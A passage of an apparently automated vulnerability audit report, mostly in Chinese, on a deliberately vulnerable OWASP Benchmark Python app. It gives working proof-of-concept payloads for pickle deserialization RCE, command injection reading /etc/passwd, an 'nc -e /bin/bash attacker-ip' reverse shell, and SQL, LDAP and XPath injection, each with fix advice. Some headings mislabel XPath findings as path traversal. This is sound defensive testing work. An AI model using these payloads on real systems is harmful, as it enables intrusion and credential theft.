+2. 命令输出：POST 发送 pickle payload → /tmp/id_output 包含 "uid=0(root)"（确认命令执行并捕获输出）  
+3. 文件读取：POST 发送 pickle payload → /tmp/passwd_output 包含 /etc/passwd 内容（确认任意文件读取能力）  
+4. 代码证据：testcode/BenchmarkTest00825.py:47 行 pickle.loads(base64.urlsafe_b64decode(bar))，其中 bar 直接来自用户请求参数，无任何净化
+
+**PoC**：
+```
+# 1. 生成恶意 pickle payload：
+python3 -c "
+import pickle, base64
+class RCE:
+    def __reduce__(self):
+        import os
+        return (os.system, ('id > /tmp/pwned',))
+print(base64.urlsafe_b64encode(pickle.dumps(RCE())).decode())
+"
+
+# 2. 发送请求触发 RCE（payload 替换为你生成的）：
+curl -X POST 'http://localhost:8443/benchmark/deserialization-00/BenchmarkTest00825?BenchmarkTest00825=<payload>'
+
+# 3. 验证命令已执行：
+cat /tmp/pwned
+```
+
+**修复建议**：永远不要对不可信数据使用 pickle.loads()。pickle 反序列化会执行任意代码，不是安全的数据交换格式。替代方案：(1) 使用 JSON 或其它安全序列化格式（如 msgpack, protobuf）；(2) 如果必须使用 pickle，应在隔离的沙箱环境中反序列化，或对输入做严格的数字签名验证（确保只有可信方签名过的数据才被反序列化）。
+
+### 2.30 Insecure Deserialization — testcode/BenchmarkTest00898.py:49
+
+- **类型**：CWE-502 Insecure Deserialization
+- **严重度**：CRITICAL (CVSS v3.1 9.8 `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H`)
+  · **CVSS 向量说明**（据本漏洞具体情况评定）：攻击途径=网络；攻击复杂度=低；所需权限=无；用户交互=不需要；影响范围=不变；机密性影响=高；完整性影响=高；可用性影响=高
+- **置信度**：已动态复现
+
+**① 位置** — sink：`testcode/BenchmarkTest00898.py:49` (函数 `BenchmarkTest00898_post`)
+
+**② 调用/污点路径**：
+  - `testcode/BenchmarkTest00898.py:49` [tainted] 进入危险汇聚点
+
+**③ 可达性**：可达 (置信 0.88) — 调用图确认可达：BenchmarkTest00898_post@testcode/BenchmarkTest00898.py:28
+
+**④ 验证**：静态判定 `confirmed` — 漏洞完全成立。代码层面：第49行 pickle.loads(base64.urlsafe_b64decode(bar)) 将用户可控的查询参数直接反序列化，bar 经过条件判断（第38-40行）后始终赋值为用户输入的 param，无任何净化。实弹复现：通过构造恶意 pickle 载荷（__reduce__ 执行 os.system），成功在服务器上执行任意命令，已验证创建文件和读取 /etc/passwd 两次独立 RCE。
+  · 动态：✅ 已复现 — 【代码证据】testcode/BenchmarkTest00898.py:49：pickle.loads(base64.urlsafe_b64decode(bar))，bar 源自用户可控的查询参数 BenchmarkTest00898（第34-40行），无任何输入净化或完整性校验。【运行时证据】两次独立 RCE 验证：(1) 发送 pickle 载荷执行 os.system('echo PWNED_BY_PICKLE > /tmp/pwned.txt') → 文件创建成功（内容 PWNED_BY_PICKLE）；(2) 发送载荷执行 os.system('cat /etc/passwd > /tmp/exfil.txt') → 成功读取系统密码文件。
+
+**PoC**：
+```
+# 生成恶意 pickle 载荷（执行任意命令）
+python3 -c "
+import pickle, base64
+class RCE:
+    def __reduce__(self):
+        return (__import__('os').system, ('cat /etc/passwd > /tmp/exfil.txt',))
+payload = pickle.dumps(RCE())
+print(base64.urlsafe_b64encode(payload).decode())
+"
+# 发送请求（无需鉴权）
+curl -v 'http://127.0.0.1:8443/benchmark/deserialization-00/BenchmarkTest00898?BenchmarkTest00898=<BASE64_ENCODED_PAYLOAD>'
+# 验证命令执行结果
+cat /tmp/exfil.txt
+```
+
+**修复建议**：永远不要使用 pickle.loads() 反序列化不可信数据。Python pickle 不是安全格式，会执行任意代码。替代方案：(1) 使用 JSON（json.loads）或其他安全序列化格式；(2) 如必须反序列化 Python 对象，使用 hmac 签名验证数据完整性；(3) 或使用更安全的序列化库如 marshmallow 配合 schema 校验。
+
+### 2.31 OS Command Injection — testcode/BenchmarkTest00899.py:64
+
+- **类型**：CWE-78 OS Command Injection
+- **严重度**：CRITICAL (CVSS v3.1 9.8 `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H`)
+  · **CVSS 向量说明**（据本漏洞具体情况评定）：攻击途径=网络；攻击复杂度=低；所需权限=无；用户交互=不需要；影响范围=不变；机密性影响=高；完整性影响=高；可用性影响=高
+- **置信度**：已动态复现
+
+**① 位置** — sink：`testcode/BenchmarkTest00899.py:64` (函数 `BenchmarkTest00899_post`)
+
+**② 调用/污点路径**：
+  - `testcode/BenchmarkTest00899.py:64` [tainted] 进入危险汇聚点
+
+**③ 可达性**：可达 (置信 0.88) — 调用图确认可达：BenchmarkTest00899_post@testcode/BenchmarkTest00899.py:28
+
+**④ 验证**：静态判定 `confirmed` — 代码分析与动态复现双重确认：用户输入从查询参数 param → match case 'A' 直接赋值 bar → 字符串拼接进 f"echo {bar}" → subprocess.run(["sh", "-c", f"echo {bar}"])。无任何净化/过滤/转义，攻击者可通过分号、反引号、$() 等方式注入任意 shell 命令。已通过 http_probe 实弹复现：?BenchmarkTest00899=test%3Bid 成功执行 id 命令并回显 uid=0(root)；?BenchmarkTest00899=test%3Bcat%20/etc/passwd 成功读取系统密码文件。
+  · 动态：✅ 已复现 — 1) 代码行62: argList.append(f"echo {bar}") 将未经净化的用户输入直接拼入 shell 命令字符串；2) 动态复现：发送 ?BenchmarkTest00899=test%3Bid 返回 "uid=0(root) gid=0(root) groups=0(root)"；3) 动态复现：发送 ?BenchmarkTest00899=test%3Bcat%20/etc/passwd 返回完整的 /etc/passwd 文件内容；4) 应用无鉴权，以 root 权限运行，暴露于 8443 端口。
+
+**PoC**：
+```
+# 命令执行（id）：
+GET /benchmark/cmdi-00/BenchmarkTest00899?BenchmarkTest00899=test%3Bid
+
+# 读取任意文件（/etc/passwd）：
+GET /benchmark/cmdi-00/BenchmarkTest00899?BenchmarkTest00899=test%3Bcat%20/etc/passwd
+
+# 反弹 shell 等任意命令均可。无需鉴权，无需Cookie。
+```
+
+**修复建议**：禁止将用户输入直接拼接到 shell 命令字符串中。应使用安全方案之一：1) 若只需 echo 用户输入，改用 Python 原生 print() 或直接返回输入，完全避免 shell 调用；2) 如需调用外部命令，使用 subprocess.run() 的列表形式（不传 shell=True/-c），将用户输入作为参数传递而非命令字符串拼接；3) 对必须经过 shell 的场景，使用 shlex.quote() 对用户输入进行严格转义。
+
+### 2.32 OS Command Injection — testcode/BenchmarkTest01191.py:52
+
+- **类型**：CWE-78 OS Command Injection
+- **严重度**：CRITICAL (CVSS v3.1 9.8 `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H`)
+  · **CVSS 向量说明**（据本漏洞具体情况评定）：攻击途径=网络；攻击复杂度=低；所需权限=无；用户交互=不需要；影响范围=不变；机密性影响=高；完整性影响=高；可用性影响=高
+- **置信度**：已动态复现
+
+**① 位置** — sink：`testcode/BenchmarkTest01191.py:52` (函数 `BenchmarkTest01191_post`)
+
+**② 调用/污点路径**：
+  - `testcode/BenchmarkTest01191.py:52` [tainted] 进入危险汇聚点
+
+**③ 可达性**：可达 (置信 0.88) — 调用图确认可达：BenchmarkTest01191_post@testcode/BenchmarkTest01191.py:28
+
+**④ 验证**：静态判定 `confirmed` — Full OS command injection confirmed: user-supplied form parameter 'BenchmarkTest01191' is taken directly from request.form.get() (line 34) and interpolated into a shell command string `f"echo {param}"` (line 50) which is passed to `subprocess.run(['sh', '-c', ...])` (line 52) with NO sanitization or escaping whatsoever. Both `;id` and `;cat /etc/passwd` payloads executed successfully, returning arbitrary command output in the HTTP response.
+  · 动态：✅ 已复现 — (1) `POST /benchmark/cmdi-00/BenchmarkTest01191` with body `BenchmarkTest01191=;id` → response contains `uid=0(root) gid=0(root) groups=0(root)` proving arbitrary command execution as root. (2) `BenchmarkTest01191=;cat /etc/passwd` → response contains the full /etc/passwd file content. (3) Code review confirms: line 34 reads user input from form, line 50 interpolates into `f"echo {param}"`, line 52 passes to `subprocess.run(['sh', '-c', ...])` — no sanitization between source and sink.
+
+**PoC**：
+```
+# OS command injection - arbitrary execution as root
+curl -X POST 'http://localhost:8443/benchmark/cmdi-00/BenchmarkTest01191' \
+  -d 'BenchmarkTest01191=;id'
+
+# Read sensitive files
+curl -X POST 'http://localhost:8443/benchmark/cmdi-00/BenchmarkTest01191' \
+  -d 'BenchmarkTest01191=;cat /etc/passwd'
+
+# Reverse shell (if tools available)
+curl -X POST 'http://localhost:8443/benchmark/cmdi-00/BenchmarkTest01191' \
+  -d 'BenchmarkTest01191=;nc -e /bin/bash attacker-ip 4444'
+
+# The GET route also works (calls same handler) but needs form param sent
+```
+
+**修复建议**：NEVER use user input in shell commands passed to `subprocess.run()` with `shell=True` or via `sh -c`. Use safe alternatives: (1) Use `subprocess.run()` with a list of arguments (e.g., `['echo', param]`) which avoids shell interpretation; (2) Use `shlex.quote(param)` to escape shell metacharacters if shell execution is unavoidable; (3) Better yet, implement a strict allowlist for any command/argument values. The most secure fix: replace `argList.append(f"echo {param}")` with `argList = ['echo', param]` to remove the shell entirely.
+
+### 2.33 SQL Injection — testcode/BenchmarkTest00454.py:41
+
+- **类型**：CWE-89 SQL Injection
+- **严重度**：CRITICAL (CVSS v3.1 9.1 `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N`)
+  · **CVSS 向量说明**（据本漏洞具体情况评定）：攻击途径=网络；攻击复杂度=低；所需权限=无；用户交互=不需要；影响范围=不变；机密性影响=高；完整性影响=高；可用性影响=无
+- **置信度**：已动态复现
+
+**① 位置** — sink：`testcode/BenchmarkTest00454.py:41` (函数 `BenchmarkTest00454_post`)
+  · source：`testcode/BenchmarkTest00454.py:31`
+
+**② 调用/污点路径**：
+  - `testcode/BenchmarkTest00454.py:31` [user_input] 来自不可信输入
+  - `testcode/BenchmarkTest00454.py:36` [tainted] 传播/拼接
+  - `testcode/BenchmarkTest00454.py:41` [tainted] 进入危险汇聚点
+
+**③ 可达性**：可达 (置信 0.88) — 调用图确认可达：BenchmarkTest00454_post@testcode/BenchmarkTest00454.py:28
+
+**④ 验证**：静态判定 `confirmed` — 候选漏洞完全成立。代码第 41 行将不可信 HTTP 头 BenchmarkTest00454 的值直接通过 f-string 插值进 SQL 查询，无任何参数化、转义或净化处理。base64 encode/decode 是空操作，不改变输入。已用三个 payload 在沙箱中成功复现：(1) 布尔注入 ' OR '1'='1 返回全部 4 个用户；(2) UNION SELECT 从 users 表提取数据；(3) UNION SELECT 从 employee 表提取跨表数据。项目无鉴权系统，任何人可访问此端点。
+  · 动态：✅ 已复现 — 1. 代码审查：第 41 行 `sql = f'SELECT username from USERS where password = \'{bar}\''` 直接拼接用户输入。
+2. 发送 header `BenchmarkTest00454: ' OR '1'='1` → 返回 User01, User02, User03, foo（全部 4 个用户），证实布尔注入。
+3. 发送 header `BenchmarkTest00454: ' UNION SELECT first_name FROM employee WHERE '1'='1` → 返回 "foo"，证实跨表 UNION 注入。
+4. 项目无任何鉴权，攻击者可直接利用。
+
+**PoC**：
+```
+# 布尔注入 - 返回所有用户
+curl -X POST "http://localhost:8443/benchmark/sqli-00/BenchmarkTest00454" \
+  -H "BenchmarkTest00454: ' OR '1'='1"
+
+# UNION注入 - 从 employee 表提取数据
+curl -X POST "http://localhost:8443/benchmark/sqli-00/BenchmarkTest00454" \
+  -H "BenchmarkTest00454: ' UNION SELECT first_name FROM employee WHERE '1'='1"
+
+# UNION注入 - 从 score 表提取数据
+curl -X POST "http://localhost:8443/benchmark/sqli-00/BenchmarkTest00454" \
+  -H "BenchmarkTest00454: ' UNION SELECT nick FROM score WHERE '1'='1"
+```
+
+**修复建议**：使用参数化查询（prepared statement）替代 f-string 插值。对于 SQLite，应将第 41-44 行改为：
+```
+sql = 'SELECT username from USERS where password = ?'
+cur.execute(sql, (bar,))
+```
+这可以完全避免 SQL 注入风险，因为用户输入被视为数据而非 SQL 代码。
+
+### 2.34 Insecure Deserialization — testcode/BenchmarkTest00657.py:53
+
+- **类型**：CWE-502 Insecure Deserialization
+- **严重度**：CRITICAL (CVSS v3.1 9.8 `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H`)
+  · **CVSS 向量说明**（据本漏洞具体情况评定）：攻击途径=网络；攻击复杂度=低；所需权限=无；用户交互=不需要；影响范围=不变；机密性影响=高；完整性影响=高；可用性影响=高
+- **置信度**：疑似(需人工复核)
+
+**① 位置** — sink：`testcode/BenchmarkTest00657.py:53` (函数 `BenchmarkTest00657_post`)
+  · source：`testcode/BenchmarkTest00657.py:34`
+
+**② 调用/污点路径**：
+  - `testcode/BenchmarkTest00657.py:34` [user_input] 来自不可信输入
+  - `testcode/BenchmarkTest00657.py:43` [tainted] 传播/拼接
+  - `testcode/BenchmarkTest00657.py:53` [tainted] 进入危险汇聚点
+
+**③ 可达性**：可达 (置信 0.88) — 调用图确认可达：BenchmarkTest00657_post@testcode/BenchmarkTest00657.py:28
+
+**④ 验证**：静态判定 `suspected` — 深度核验已实弹尝试但未在步数内下最终结论；据现有进展保守判疑似，附部分证据。
+  · 动态：未复现 — 实弹尝试进行中被步数截断（已保留部分证据，未冷跑旧逻辑）。
+
+**PoC**：
+```
+Provide a crafted serialized payload; oracle: gadget side-effect (marker file/command).
+```
+
+**修复建议**：不要反序列化不可信数据。使用安全格式（JSON），或 yaml.safe_load；如必须，做签名校验与类型白名单。
+
+### 2.35 SQL Injection — testcode/BenchmarkTest00099.py:46
+
+- **类型**：CWE-89 SQL Injection
+- **严重度**：HIGH (CVSS v3.1 8.2 `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:L/A:N`)
+  · **CVSS 向量说明**（据本漏洞具体情况评定）：攻击途径=网络；攻击复杂度=低；所需权限=无；用户交互=不需要；影响范围=不变；机密性影响=高；完整性影响=低；可用性影响=无
+- **置信度**：已动态复现
+
+**① 位置** — sink：`testcode/BenchmarkTest00099.py:46` (函数 `BenchmarkTest00099_post`)
+  · source：`testcode/BenchmarkTest00099.py:31`
+
+**② 调用/污点路径**：
+  - `testcode/BenchmarkTest00099.py:31` [user_input] 来自不可信输入
+  - `testcode/BenchmarkTest00099.py:38` [tainted] 传播/拼接
+  - `testcode/BenchmarkTest00099.py:46` [tainted] 进入危险汇聚点
+
+**③ 可达性**：可达 (置信 0.88) — 调用图确认可达：BenchmarkTest00099_post@testcode/BenchmarkTest00099.py:28
+
+**④ 验证**：静态判定 `confirmed` — CWE-89 SQL Injection fully confirmed and dynamically reproduced. The user-supplied form parameter 'BenchmarkTest00099' flows through configparser.ConfigParser (no sanitization effect) and is directly interpolated into a SQL query via f-string at line 46. The query is executed against SQLite via cursor.execute() with no parameterization. Both boolean-based blind (' OR '1'='1) and UNION-based (' UNION SELECT ...) injection payloads successfully extracted database contents.
+  · 动态：✅ 已复现 — 1. Normal request with 'test' returns empty results (no matching password)
+2. Payload "' OR '1'='1" returns ALL 4 users: User01, User02, User03, foo — proving boolean-based SQL injection
+3. Payload "' UNION SELECT salary FROM EMPLOYEE WHERE '1'='1" returns 34567 from the EMPLOYEE table — proving UNION-based SQL injection
+The application has no authentication system (OWASP Benchmark test suite), so the endpoint is publicly accessible.
+
+**PoC**：
+```
+# Exploit SQL Injection on /benchmark/sqli-00/BenchmarkTest00099
+# Payload 1: Boolean-based - extract all users
+curl -X POST 'http://127.0.0.1:8443/benchmark/sqli-00/BenchmarkTest00099' \
+  -d "BenchmarkTest00099=' OR '1'='1"
+
+# Payload 2: UNION-based - extract salary from EMPLOYEE table
+curl -X POST 'http://127.0.0.1:8443/benchmark/sqli-00/BenchmarkTest00099' \
+  -d "BenchmarkTest00099=' UNION SELECT salary FROM EMPLOYEE WHERE '1'='1"
+
+# Payload 3: Extract specific user's password
+curl -X POST 'http://127.0.0.1:8443/benchmark/sqli-00/BenchmarkTest00099' \
+  -d "BenchmarkTest00099=' UNION SELECT password FROM USERS WHERE username='foo' AND '1'='1"
+```
+
+**修复建议**：Replace f-string interpolation with parameterized queries. For SQLite, use '?' placeholders:
+  sql = 'SELECT username from USERS where password = ?'
+  cur.execute(sql, (bar,))
+This ensures the user input is always treated as data, never as executable SQL code.
+
+### 2.36 SQL Injection — testcode/BenchmarkTest00283.py:46
+
+- **类型**：CWE-89 SQL Injection
+- **严重度**：HIGH (CVSS v3.1 7.5 `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N`)
+  · **CVSS 向量说明**（据本漏洞具体情况评定）：攻击途径=网络；攻击复杂度=低；所需权限=无；用户交互=不需要；影响范围=不变；机密性影响=高；完整性影响=无；可用性影响=无
+- **置信度**：已动态复现
+
+**① 位置** — sink：`testcode/BenchmarkTest00283.py:46` (函数 `BenchmarkTest00283_post`)
+
+**② 调用/污点路径**：
+  - `testcode/BenchmarkTest00283.py:46` [tainted] 进入危险汇聚点
+
+**③ 可达性**：可达 (置信 0.88) — 调用图确认可达：BenchmarkTest00283_post@testcode/BenchmarkTest00283.py:28
+
+**④ 验证**：静态判定 `confirmed` — 代码审计确认：第46行使用 f-string 将用户输入 bar（源自表单参数 BenchmarkTest00283）直接拼入 SQL 查询。运行时复现确认：注入 `' OR '1'='1` 返回全部4个用户（正常仅返回1个匹配用户）；UNION SELECT 可跨表读取 EMPLOYEE.first_name（"foo"）和 EMPLOYEE.salary（"34567"）。端点公开无需鉴权。
+  · 动态：✅ 已复现 — 1) 正常请求 (password='P455w0rd') 返回 1 条结果: User01
+2) 注入 `' OR '1'='1` 返回 4 条结果: User01, User02, User03, foo（证明 WHERE 子句被绕过）
+3) 注入 `' UNION SELECT first_name FROM EMPLOYEE--` 返回: foo（证明跨表读取成功）
+4) 注入 `' UNION SELECT salary FROM EMPLOYEE--` 返回: 34567（证明敏感数据可提取）
+
+**PoC**：
+```
+# PoC 1: Boolean-based 注入 - 绕过认证获取所有用户
+curl -X POST 'http://127.0.0.1:8443/benchmark/sqli-00/BenchmarkTest00283' \
+  -d "BenchmarkTest00283=' OR '1'='1"
+
+# PoC 2: UNION 注入 - 跨表读取 EMPLOYEE.first_name
+curl -X POST 'http://127.0.0.1:8443/benchmark/sqli-00/BenchmarkTest00283' \
+  -d "BenchmarkTest00283=' UNION SELECT first_name FROM EMPLOYEE--"
+
+# PoC 3: UNION 注入 - 跨表读取 EMPLOYEE.salary
+curl -X POST 'http://127.0.0.1:8443/benchmark/sqli-00/BenchmarkTest00283' \
+  -d "BenchmarkTest00283=' UNION SELECT salary FROM EMPLOYEE--"
+```
+
+**修复建议**：使用参数化查询（预编译语句）替代 f-string 拼接。例如：cur.execute('SELECT username from USERS where password = ?', (bar,))。对于 SQLite 使用 ? 占位符，对于其他数据库使用对应参数占位符。
+
+### 2.37 SQL Injection — testcode/BenchmarkTest00284.py:44
+
+- **类型**：CWE-89 SQL Injection
+- **严重度**：HIGH (CVSS v3.1 7.5 `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N`)
+  · **CVSS 向量说明**（据本漏洞具体情况评定）：攻击途径=网络；攻击复杂度=低；所需权限=无；用户交互=不需要；影响范围=不变；机密性影响=高；完整性影响=无；可用性影响=无
+- **置信度**：已动态复现
+
+**① 位置** — sink：`testcode/BenchmarkTest00284.py:44` (函数 `BenchmarkTest00284_post`)
+
+**② 调用/污点路径**：
+  - `testcode/BenchmarkTest00284.py:44` [tainted] 进入危险汇聚点
+
+**③ 可达性**：可达 (置信 0.88) — 调用图确认可达：BenchmarkTest00284_post@testcode/BenchmarkTest00284.py:28
+
+**④ 验证**：静态判定 `confirmed` — The vulnerability is classic SQL injection. The POST parameter `BenchmarkTest00284` is taken directly from the HTTP form body (line 34) via `wrapped.get_form_parameter()`, flows through `bar` (lines 39-40, the 'should' in bar condition is always true), and is interpolated into the SQL query on line 44 via an f-string with zero sanitization. The query is executed via `cur.execute(sql)` on line 47. This was dynamically reproduced with 3 payloads demonstrating: (1) boolean-based injection returning all users, (2) UNION-based extraction of all usernames + passwords, (3) schema dump of all tables via sqlite_master.
+  · 动态：✅ 已复现 — 1) Tautology injection (`' OR '1'='1`) returned all 4 users (User01, User02, User03, foo) instead of just one.
+2) UNION injection (`' UNION SELECT username || ':' || password from USERS--`) extracted credentials: User01:P455w0rd, User02:B3nchM3rk, User03:a$c11, foo:bar.
+3) Schema injection (`' UNION SELECT sql FROM sqlite_master WHERE type='table'--`) dumped all 4 table definitions (USERS, SCORE, EMPLOYEE, CERTIFICATE).
+
+**PoC**：
+```
+# Extract all usernames (boolean/tautology)
+curl -X POST 'http://localhost:8443/benchmark/sqli-00/BenchmarkTest00284' \
+  -d "BenchmarkTest00284=' OR '1'='1"
+
+# Extract all usernames and passwords (UNION)
+curl -X POST 'http://localhost:8443/benchmark/sqli-00/BenchmarkTest00284' \
+  -d "BenchmarkTest00284=' UNION SELECT username || ':' || password from USERS--"
+
+# Dump all table schemas
+curl -X POST 'http://localhost:8443/benchmark/sqli-00/BenchmarkTest00284' \
+  -d "BenchmarkTest00284=' UNION SELECT sql FROM sqlite_master WHERE type='table'--"
+```
+
+**修复建议**：Replace the f-string SQL construction with parameterized queries. In SQLite/Python, use `?` placeholders:
+
+```python
+sql = 'SELECT username from USERS where password = ?'
+cur.execute(sql, (bar,))
+```
+
+This ensures user input is always treated as data, never as executable SQL syntax. All database queries across the project should follow this pattern (use parameterized queries or an ORM).
+
+### 2.38 CWE-90 LDAP Injection — testcode/BenchmarkTest00265.py:42
+
+- **类型**：CWE-90 LDAP Injection
+- **严重度**：HIGH (CVSS v3.1 7.5 `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N`)
+  · **CVSS 向量说明**（据本漏洞具体情况评定）：攻击途径=网络；攻击复杂度=低；所需权限=无；用户交互=不需要；影响范围=不变；机密性影响=高；完整性影响=无；可用性影响=无
+- **置信度**：已动态复现
+
+**① 位置** — sink：`testcode/BenchmarkTest00265.py:42` (函数 `BenchmarkTest00265_post`)
+  · source：`testcode/BenchmarkTest00265.py:31`
+
+**② 调用/污点路径**：
+  - `testcode/BenchmarkTest00265.py:31` [user_input] 来自不可信输入
+  - `testcode/BenchmarkTest00265.py:36` [tainted] 传播/拼接
+  - `testcode/BenchmarkTest00265.py:42` [tainted] 进入危险汇聚点
+
+**③ 可达性**：可达 (置信 0.88) — 调用图确认可达：BenchmarkTest00265_post@testcode/BenchmarkTest00265.py:28
+
+**④ 验证**：静态判定 `confirmed` — 代码层面：第 42 行 f-string 直接将用户输入的 form 参数 `bar` 无任何转义/净化地拼接进 LDAP 搜索过滤器。无 LDAP 转义函数（如 ldap3.utils.conv.escape_filter_chars）被调用。动态复现证明：发送 payload `*)(uid=*` 使原过滤器 `(&(objectclass=person)(|(uid={bar})(street=...)))` 语义变更为 `(&(objectclass=person)(|(uid=*)(uid=*)(street=...)))`，返回了全部 3 条目录条目（Mr Unknown、MS Bar、foo），而合法查询 `foo` 仅返回 2 条。双向证据确凿。
+  · 动态：✅ 已复现 — 正常请求（bar=foo）响应返回 2 条记录（MS Bar, foo）。注入载荷 `*)(uid=*` 响应返回全部 3 条记录（Mr Unknown, MS Bar, foo），证明了过滤器被篡改。代码第 42 行 f-string 直接拼接用户输入，无任何净化（项目中无 LDAP escape 函数）。
+
+**PoC**：
+```
+# 复现 LDAP 注入 - 获取所有条目（绕过 uid 过滤条件）
+curl -s 'http://localhost:8443/benchmark/ldapi-00/BenchmarkTest00265' \
+  -X POST \
+  -d 'BenchmarkTest00265=*)(uid=*'
+
+# 正常请求（对照）
+curl -s 'http://localhost:8443/benchmark/ldapi-00/BenchmarkTest00265' \
+  -X POST \
+  -d 'BenchmarkTest00265=foo'
+```
+
+**修复建议**：使用 ldap3 内置的过滤器转义函数对用户输入进行净化，或使用参数化查询（若 ldap3 支持）。具体方案：
+1. `from ldap3.utils.conv import escape_filter_chars`
+2. `safe_bar = escape_filter_chars(bar)`
+3. `filter = f'(&(objectclass=person)(|(uid={safe_bar})(street=The streetz 4 Ms bar)))'`
+这会将 `*)(uid=*` 转义为 `\2a\29\28uid\3d\2a`，使其被当作字面量处理而非 LDAP 语法运算符。
+
+### 2.39 Path Traversal — testcode/BenchmarkTest00101.py:54
+
+- **类型**：CWE-643 XPath Injection
+- **严重度**：HIGH (CVSS v3.1 7.5 `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N`)
+  · **CVSS 向量说明**（据本漏洞具体情况评定）：攻击途径=网络；攻击复杂度=低；所需权限=无；用户交互=不需要；影响范围=不变；机密性影响=高；完整性影响=无；可用性影响=无
+- **置信度**：数据流已确证
+
+**① 位置** — sink：`testcode/BenchmarkTest00101.py:54` (函数 `BenchmarkTest00101_post`)
+  · source：`testcode/BenchmarkTest00101.py:31`
+
+**② 调用/污点路径**：
+  - `testcode/BenchmarkTest00101.py:31` [user_input] 来自不可信输入
+  - `testcode/BenchmarkTest00101.py:42` [tainted] 传播/拼接
+  - `testcode/BenchmarkTest00101.py:54` [tainted] 进入危险汇聚点
+
+**③ 可达性**：可达 (置信 0.88) — 调用图确认可达：BenchmarkTest00101_post@testcode/BenchmarkTest00101.py:28
+
+**④ 验证**：静态判定 `confirmed` — Code analysis conclusively proves XPath injection: (1) Source at line 31: `request.form.get('BenchmarkTest00101')` — fully user-controlled input from HTTP POST form; (2) Propagation at lines 35-40: `guess = 'ABC'[0]` evaluates to 'A', so the match always takes case 'A' which sets `bar = param` — the user input passes through unmodified with zero sanitization; (3) Sink at line 54: `f\"/Employees/Employee[@emplid='{bar}']\"` — the unsanitized input is directly interpolated into an XPath query string with no parameterization, no escaping of XPath-special characters (like `'`, `]`, `*`, `or`, `and`). The `elementpath.select()` library then executes the attacker-controlled XPath expression against the XML document. No sanitization, no validation, no escaping exists between source and sink. The vulnerability cannot be dynamically reproduced because the file has a Python 3.11 syntax error on unrelated line 61 (nested same-quote f-string `f'...{', '.join(...)}...'`), preventing the entire module from loading — this is a separate defect from the XPath injection itself.
+  · 动态：未复现 — Code analysis conclusively proves XPath injection: (1) Source at line 31: `request.form.get('BenchmarkTest00101')` — fully user-controlled input from HTTP POST form; (2) Propagation at lines 35-40: `guess = 'ABC'[0]` evaluates to 'A', so the match always takes case 'A' which sets `bar = param` — the user input passes through unmodified with zero sanitization; (3) Sink at line 54: `f\"/Employees/Employee[@emplid='{bar}']\"` — the unsanitized input is directly interpolated into an XPath query string with no parameterization, no escaping of XPath-special characters (like `'`, `]`, `*`, `or`, `and`). The `elementpath.select()` library then executes the attacker-controlled XPath expression against the XML document. No sanitization, no validation, no escaping exists between source and sink. The vulnerability cannot be dynamically reproduced because the file has a Python 3.11 syntax error on unrelated line 61 (nested same-quote f-string `f'...{', '.join(...)}...'`), preventing the entire module from loading — this is a separate defect from the XPath injection itself.
+
+**PoC**：
+```
+The endpoint is not served due to syntax error in the same file. However, the intended exploit path (as per code) would be:
+
+```
+POST /benchmark/xpathi-00/BenchmarkTest00101
+Content-Type: application/x-www-form-urlencoded
+
+BenchmarkTest00101=xxx' or '1'='1
+```
+
+This would cause the XPath query to become:
+```
+/Employees/Employee[@emplid='xxx' or '1'='1']
+```
+
+Which would match ALL Employee nodes (bypassing the emplid filter), returning all employee data (firstname, lastname, age, email) from the XML document, regardless of which employee was intended to be looked up.
+
+More aggressive payloads could use XPath 2.0 functions (supported by elementpath) to extract system information or traverse the XML tree beyond the intended scope.
+```
+
+**修复建议**：1. **Use parameterized XPath (preferred):** Use `elementpath.select(root, '/Employees/Employee[@emplid=$var]', {'var': bar})` with variable bindings instead of string interpolation. 2. **Input validation/whitelisting:** If emplid values are predictable (1111-4444), validate input against a whitelist. 3. **Contextual escaping:** If parameterization is impossible, properly escape XPath-special characters (`'` → `concat('', \"'\", '')`, `"`, `]`, `[`, `@`, `*`, `/`, `or`, `and`). 4. **Fix syntax error on line 61:** Change the f-string to avoid nested same-quote expressions, e.g., `'Your XPATH query results are: <br>[ ' + ', '.join(node_strings) + ' ]'`.
+
+### 2.40 Path Traversal — testcode/BenchmarkTest00104.py:50
+
+- **类型**：CWE-643 XPath Injection
+- **严重度**：HIGH (CVSS v3.1 7.5 `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N`)
+  · **CVSS 向量说明**（据本漏洞具体情况评定）：攻击途径=网络；攻击复杂度=低；所需权限=无；用户交互=不需要；影响范围=不变；机密性影响=高；完整性影响=无；可用性影响=无
+- **置信度**：数据流已确证
+
+**① 位置** — sink：`testcode/BenchmarkTest00104.py:50` (函数 `BenchmarkTest00104_post`)
+  · source：`testcode/BenchmarkTest00104.py:31`
+
+**② 调用/污点路径**：
+  - `testcode/BenchmarkTest00104.py:31` [user_input] 来自不可信输入
+  - `testcode/BenchmarkTest00104.py:40` [tainted] 传播/拼接
+  - `testcode/BenchmarkTest00104.py:50` [tainted] 进入危险汇聚点
+
+**③ 可达性**：可达 (置信 0.88) — 调用图确认可达：BenchmarkTest00104_post@testcode/BenchmarkTest00104.py:28
+
+**④ 验证**：静态判定 `confirmed` — 通过全面代码审计与动态验证，确认 XPath 注入漏洞在源代码层面确实存在，但因测试用例文件（testcode/BenchmarkTest00104.py）第58行存在独立的 f-string 语法错误（在 Python 3.11 的 f-string 表达式中使用了与外围相同的引号字符），导致该模块无法被编译/导入，路由未注册，端点不可达，因此未能实弹触发。
+  · 动态：未复现 — 通过全面代码审计与动态验证，确认 XPath 注入漏洞在源代码层面确实存在，但因测试用例文件（testcode/BenchmarkTest00104.py）第58行存在独立的 f-string 语法错误（在 Python 3.11 的 f-string 表达式中使用了与外围相同的引号字符），导致该模块无法被编译/导入，路由未注册，端点不可达，因此未能实弹触发。
+
+**PoC**：
+```
